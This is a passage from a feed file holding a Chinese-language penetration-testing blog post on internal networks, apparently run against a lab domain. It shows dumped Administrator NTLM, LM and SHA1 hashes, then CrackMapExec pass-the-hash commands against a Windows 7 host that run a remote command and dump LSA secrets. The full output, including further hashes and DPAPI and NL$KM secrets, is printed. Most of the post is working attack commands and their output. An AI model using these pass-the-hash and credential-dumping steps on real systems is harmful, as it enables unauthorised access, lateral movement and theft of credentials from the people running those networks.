-&lt;p&gt;获取NTLM Hash&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;****
-        msv :
-         [00000003] Primary
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * LM       : 5609e3f4c7c56d5fa86fb73c70515bd7
-         * NTLM     : dab7de8feeb5ecac65faf9fdc6cac3a9
-         * SHA1     : 67302089bba4993f2f845e5992db0a21e64679fa
-        tspkg :
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * Password : ****
-        wdigest :
-         * Username : Administrator
-         * Domain   : PAYLOADS
-         * Password : ****
-        kerberos :
-         * Username : Administrator
-         * Domain   : PAYLOADS.ONLINE
-         * Password : ****
-        ssp :
-        credman :
-
-****
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;使用crackmapexec执行命令&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;执行命令&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 -x whoami
-SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Executed command 
-SMB         192.168.3.5     445    LIYINGZHEA30B    payloads\administrator
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;使用crackmapexec获取本地密码local-security-authoritylsa&quot;&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;CrackMapExec&lt;/code&gt;获取本地密码(Local Security Authority)LSA&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/cache# cme smb 192.168.3.5 -u administrator -H dab7de8feeb5ecac65faf9fdc6cac3a9 --lsa
-SMB         192.168.3.5     445    LIYINGZHEA30B    [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B) (domain:PAYLOADS) (signing:False) (SMBv1:True)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9 (Pwn3d!)
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumping LSA secrets
-SMB         192.168.3.5     445    LIYINGZHEA30B    WinHack:d3a4b1078aba22996575dd38056e3c99:PAYLOADS.ONLINE:PAYLOADS:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    Administrator:ff007a95ee46c0240e7f0c4b9b0c890a:PAYLOADS.ONLINE:PAYLOADS:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    PAYLOADS\LIYINGZHEA30B$:aad3b435b51404eeaad3b435b51404ee:eda8896ce9133d0bcaf0b6ece9cb0d45:::
-SMB         192.168.3.5     445    LIYINGZHEA30B    DPAPI_SYSTEM:01000000faf06c0f43acbed98d62bd9829d053acb06a00f159e3419d193ff5be56c028fe8d7f0053161d9331
-SMB         192.168.3.5     445    LIYINGZHEA30B    NL$KM:ac8c8a7ce1dd903d74a231a44fcf5df82db711df62e495da9b5f10c3a52dd618a8abce6975c69fea6a9ed69ff6511c62f9a750b5d696a69c3221dc0f1f849f3d
-SMB         192.168.3.5     445    LIYINGZHEA30B    [+] Dumped 5 LSA secrets to /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.lsa and /root/.cme/logs/LIYINGZHEA30B_192.168.3.5_2018-03-27_155122.cached
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;more-&quot;&gt;More …&lt;/h3&gt;
-
-&lt;p&gt;后续再加&lt;/p&gt;
-</description>
-        <pubDate>Tue, 27 Mar 2018 00:00:00 +0800</pubDate>
-        <link>http://localhost:4000/archivers/2018-03-27/1</link>
-        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-27/1</guid>
         
         
         <category>内网渗透</category>
